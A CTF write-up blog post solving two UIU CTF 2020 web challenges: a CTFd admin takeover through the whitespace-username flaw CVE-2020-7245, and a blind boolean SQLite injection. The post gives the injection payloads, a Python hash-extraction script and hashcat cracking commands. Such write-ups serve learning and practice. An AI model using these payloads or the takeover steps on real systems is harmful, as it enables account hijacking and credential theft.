---
layout: post
title: "UIU CTF 2020 writeup"
categories: ctf
---

| Challenge Name | Category | Solves | Points |
|:--------------:|:--------:|:------:|:------:|
|[Just a Normal CTF](#just-a-normal-ctf)| Web | 116 | 100 |
|[login_page](#login-page)| Web | 23 | 200 |


----------------

## Just a Normal CTF {#just-a-normal-ctf}
{: style="text-align: center"}
#### Category: Web | Solves: 116 | Points: 100
{: style="text-align: center"}

----------------
{:refdef: style="text-align: center;"}
![flag]({{ '/public/just-a-normal-ctf.png' | relative_url }}){: .imgCenter}
{: refdef}


This challenge was pretty straight forward.
Upon opening the challenge we are greeted with an all too familiar ctfd instance.
After a quick look around i didnt see anything that would indicate that this was not a real ctfd instance,
one interesting thing was that there is only one other user `admin`.
I signed up with a junk mail as the description suggested and was greeted by `The Flag`, a challenge.

{:refdef: style="text-align: center;"}
![flag]({{ '/public/just-a-normal-ctf-the-flag.png' | relative_url }}){: .imgCenter}
{: refdef}

Not seeing any obvious attack surface or way to solve the challenge i decided to have a quick google for CTFd cve's.
One of the first results on google [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245).

```
To exploit the vulnerability, one must register with a username identical to the victim's username, but with white space inserted before and/or after the username. This will register the account with the same username as the victim. After initiating a password reset for the new account, CTFd will reset the victim's account password due to the username collision.
```
The only requirement being that emails are enabled, which they are, i gave it a try.

I made a new account ` admin `, it let me sign up without errors.
The next step is resetting the password of our account.

{:refdef: style="text-align: center;"}
![flag]({{ '/public/password-reset.png' | relative_url }}){: .imgCenter}
{: refdef}

Following the link and resetting our password, we can now try logging in as the real `admin`.

It works!

In the admin panel we can navigate to the challenge `The Flag` and just grad the flag that is saved.

`uiuctf{defeating_security_with_a_spacebar!}`


----------------

## login_page {#login-page}
{: style="text-align: center"}
#### Category: Web | Solves: 23 | Points: 200
{: style="text-align: center"}

----------------
{:refdef: style="text-align: center;"}
![flag]({{ '/public/login-page.png' | relative_url }}){: .imgCenter}
{: refdef}

The challenge description mentions that the login page is running `sqlite`.
So ofc the first thing the do is test for SQL injections.
Opening the actual challenge site we are greeted with a barebones login form
and a way to search for users.
Let's try it out.
`%` is a wildcard character in SQL, so searching for a user called `%` dumps us the entire user list.

| Name | Bio |
|:----:|:---:|
| noob | this is noob's bio |
| alice | this is alice's bio |
| bob | this is bob's bio |
| carl | this is carl's bio |
| dania | this is dania's bio |

Trying to log in as each of the user with a junk password gives us their password hints!

| Name | Hint |
|:----:|:----:|
| noob | N/A |
| alice | My phone number (format: 000-000-0000) |
| bob | My favorite 12 digit number (md5 hashed for extra security) [starts with a 10] |
| carl | My favorite Greek God + My least favorite US state (no spaces) |
| dania | الحيوان المفضل لدي (6 أحرف عربية فقط) |

If those password hint are not lies, each of them would take way too long to guess manually or bruteforce over the web.
So back to SQL injections.

Throwing a `"` after the username and trying to log in results in an error.

### Error: Invalid input!

But commenting out the rest of the query using `-- -` results in a blank `200 OK` page.
Trying to further nail it down i tried `bob" and 1=1 -- -`, which was again a `200 OK`.
`bob" and 1=2 -- -` on the other hand showed the error from before again.
What we have here is a blind boolean based SQL injection.

Looking at a cheatsheet for sqlite injections i found
```SQL
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
```
Which is a boolean way to figure out the number of tables.
Sending the username `bob" and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) = 1 -- -`
tells us that there is only one table.
Time to figure out the name of the table.

```SQL
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

This one allows us to extract the table name one character at a time.
Quickly doing this by hand we found our table `users`.
Now we need to figure out the columns and their respective names.

For this i used the `PRAGMA_TABLE_INFO('');` function in sqlite.

```SQL
(SELECT count(name) FROM PRAGMA_TABLE_INFO('users')) < 10
```
Using this we find the number of columns in the table, which is `4`.
Now we can extract the column names.

```SQL
(SELECT hex(substr(name,1,1)) FROM PRAGMA_TABLE_INFO('users') limit 1 offset 0) < hex('a')
```
Quickly automating this using ffuf/intruder lets us slowly dump the columns names one character at a time by first increasing the `substr(name,1,1)` call
to `substr(name,2,1)` until the end of the name. Then resetting and instead increasing the `offset 1` to get the next row of results, which is out next column name.

Now we have the column names `username, password_hash, hint, bio`.
Using the same SQL injections from above i quickly checked which position each user hold in the rows and then slowly started dumping the password hashes with a py script.

```python
import requests

url = "https://login.chal.uiuc.tf/"

letters = "abcdefghijklmnopqrstuvwxyz1234567890"

password = "";
query = 'bob"and (select substr(password_hash,{},1) from users limit 1 offset 4) = "{}" -- -'

for i in range(1,33):
    for letter in letters:
        sql = {'username': query.format(i,letter) ,'password':'asd'}
        x = requests.post(url, data=sql)
        
        if len(x.content) == 0:
            password += letter
            print(password)
        else:
            pass
```
| Hash | User |
|:----:|:----:|
| 8553127fedf5daacc26f3b677b58a856| alice |
| 530bd2d24bff2d77276c4117dc1fc719| bob |
| 4106716ae604fba94f1c05318f87e063| carl |
| 661ded81b6b99758643f19517a468331| dania |
| 58970d579d25f7288599fcd709b3ded3| noob |


Sadly as the column name suggets these are password hashes -.- (MD5 based on length)
That means cracking.
Thankfully there was a great hint given to use google colab to spawn a FREE gpu instance to crack the passwords.
Following this great tutorial by [@b34rd_tek](https://twitter.com/b34rd_tek)
[Using GPU Accelerated Hashcat on Google Colaboratory FREE!](https://deadpixelsec.com/Hashcat-on-Google-Colab)

While waiting for the installation i quickly googled all the hashed which came up with a single hit.

The hash for alice is in rockyou.txt `SoccerMom2007`.
One password down, trying to log in with alice and the password we just got doesnt work though.
Trying the password on all other accounts lets us in with noob,
giving us the first fragment of the flag `You have successfully logged in! Here's part 0 of the flag: uiuctf{Dump`

Hashcat installed and i quickly tried rockyou for the other hashes, with not luck.
Remembering the password hints it looks like it wants us to use masks for hashcat to bruteforce the other passwords based on the password hints.

Which means:
Bob (mode 2600 is md5(md5(pass)))
```
hashcat -m 2600 -a 3 -o output hashes "?d?d?d?d?d?d?d?d?d?d?d?d"
```
Alice
```
hashcat -m 0 -a 3 -o output hashes "?d?d?d-?d?d?d-?d?d?d?d"
```
Dania (which was a pain to run and figure out)
```
hashcat -m 0 -a 3 --hex-charset -1 d8d9dadb -2 808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf -o output hashes "?1?2?1?2?1?2?1?2?1?2?1?2"
```
The hint was in arabic, which means the password is most likely also in arabic. This is using the full arabic unicode block which took wayy to long on the colab instance.
Being too lazy to remove junk characters, one of my teammates [@vechs](https://twitter.com/Vechshshshs) ran it in a cluster which gave us our password in a reasonable time :)

And the last password was the easiest which would be bruteforced by a simple python script, appending states and greek gods based on the constraints.

| Hash | User | Password |
|:----:|:----:|:--------:|
| 8553127fedf5daacc26f3b677b58a856| alice | 704-186-9744 |
| 530bd2d24bff2d77276c4117dc1fc719| bob | 102420484096 |
| 4106716ae604fba94f1c05318f87e063| carl | DionysusDelaware |
| 661ded81b6b99758643f19517a468331| dania |  |طاووسة
| 58970d579d25f7288599fcd709b3ded3| noob | SoccerMom2007 |
(passwords are sorted to match the user they belong to, not the hash)

Logging in with the user gave us all the remaining fragments.
```
You have successfully logged in! Here's part 1 of the flag: _4nd_un
You have successfully logged in! Here's part 2 of the flag: h45h_63
You have successfully logged in! Here's part 2 of the flag: 7_d4t_
You have successfully logged in! Here's part 4 of the flag: c45h}
```
Assembling the final flag: `uiuctf{Dump_4nd_unh45h_637_d4t_c45h}`

Shoutout to the [@thugcrowd](https://twitter.com/thugcrowd) people who i played this CTF with.
Special thanks to [@vechs](https://twitter.com/Vechshshshs) for throwing way too much hashing power at that arabic password.
And special thanks to [@sshell](https://twitter.com/sshell_) for playing and letting me leech the blog code so i could start a blog too :)